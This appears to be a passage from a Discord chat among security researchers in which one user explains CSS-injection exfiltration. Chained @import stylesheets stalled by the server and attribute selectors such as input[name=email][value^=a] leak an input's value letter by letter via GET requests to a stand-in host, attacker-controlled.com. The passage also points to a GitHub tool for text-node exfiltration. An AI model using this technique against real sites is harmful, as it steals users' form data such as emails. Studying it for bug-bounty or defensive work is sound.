
    
    In CSS injection you always work with a exfiltration server. That means that each stylesheets does 2 things:
    
    1. It matches some value in some way or another and then sends this information back to the server(e.g. if the first letter of the input "email" is "a" it could send a GET request to [https://attacker-controlled.com/?name=email&exfil=a](https://attacker-controlled.com/?name=email&exfil=a "https://attacker-controlled.com/?name=email&exfil=a") e.g. via background-image or other css properties that accept urls and request them). At this point your server has the information that the first letter is "a"
    2. Via import chaining you always also request the next stylesheet from the attacker controlled server. In practice this means that you import the first stylesheet, that:
        
        - a) Sends a GET request for the next stylesheet to the attacker-controlled server. Importantly this request will not be processed by the server until b) arrives at the attacker server
            
            - b) Match the first letter of an input or similar and exfiltrate that info to the attacker-controlled server as described in 1.
            
        
    
    (edited)
    
    ![🫡](https://discord.com/assets/6aae4f996e21c1d6fd73.svg)
    
    1
    

5. _[_10:24 PM_]_
    
    So now if you think about it, this is the workflow that can be looped forever: ----- stylesheet 1 ------
    
    1. You request stylesheet 2, but the server stalls the request and keeps you waiting for a response
    2. You exfiltrate the first letter to the server as described in line 3 of this message (GET [https://attacker-controlled.com/?name=email&exfil=h](https://attacker-controlled.com/?name=email&exfil=h "https://attacker-controlled.com/?name=email&exfil=h"))
    
    -------------------------
    
    3. After the first letter arrives at the server, the request for stylesheet 2 that has been sent before will be resolved now. HERE the first letter exfiltrated before will now be used as a matching condition
    
    ----- stylesheet 2 ------ (matching for input[name=email][value^=h]
    
    4. You request stylesheet 3, but the server stalls the request and keeps you waiting for a response
    5. You exfiltrate the first and second letter to the server as described in line 3 of this message (GET [https://attacker-controlled.com/?name=email&exfil=he](https://attacker-controlled.com/?name=email&exfil=he "https://attacker-controlled.com/?name=email&exfil=he"))
    
    --------------------------
    
    6. After the first letter and second arrives at the server, the request for stylesheet 3 that has been sent before will be resolved now. HERE the first and second letter exfiltrated before will now be used as a matching condition
    
    ----- stylesheet 3 ------ (matching for input[name=email][value^=he]
    
    7. You request stylesheet 3, but the server stalls the request and keeps you waiting for a response
    8. You exfiltrate the first and second and third letter to the server as described in line 3 of this message (GET [https://attacker-controlled.com/?name=email&exfil=hey](https://attacker-controlled.com/?name=email&exfil=hey "https://attacker-controlled.com/?name=email&exfil=hey"))
    
    --------------------------------------- This is how one of these stylesheets usually looks like, but this is a bit simplified by cutting down the amount of rules etc.: @import [https://attacker-controlled.com/next?198274981724](https://attacker-controlled.com/next?198274981724 "https://attacker-controlled.com/next?198274981724") input[name=email][value^=a] input[name=email][value^=b] input[name=email][value^=c] ... Feel free to ask more questions
    
    ![❤️](https://discord.com/assets/59fe293bafd76f395671.svg)
    
    8
    
6. ![](https://discord.com/assets/a0180771ce23344c2a95.png)@sys0wn
    
    bruh haha
    
    ![](https://cdn.discordapp.com/avatars/265292115343310848/0822e0d0604b996ea2bace5a601f121a.webp?size=100)
    
    ### Roll4Combat _—_ 11/4/24, 11:00 PM
    
    Thanks for the explanation I hadn't actually taken a look at css injection stuff before!
    
7. ![](https://discord.com/assets/a0180771ce23344c2a95.png)
    
    ### sys0wn![](https://cdn.discordapp.com/role-icons/1173714882093396069/b137aef70f54851cde5fbd65b4f7fa19.webp?size=28&quality=lossless) _—_ 11/4/24, 11:15 PM
    
    For text-node exfiltration, which in principle kinda works in a similar way you can find an explanation (and code) in the Readme of [https://github.com/sys0wn/css-scrollbar-attack/](https://github.com/sys0wn/css-scrollbar-attack/ "https://github.com/sys0wn/css-scrollbar-attack/"). I used something similar to that to pop a vuln on shopify bbp but it still ain't perfect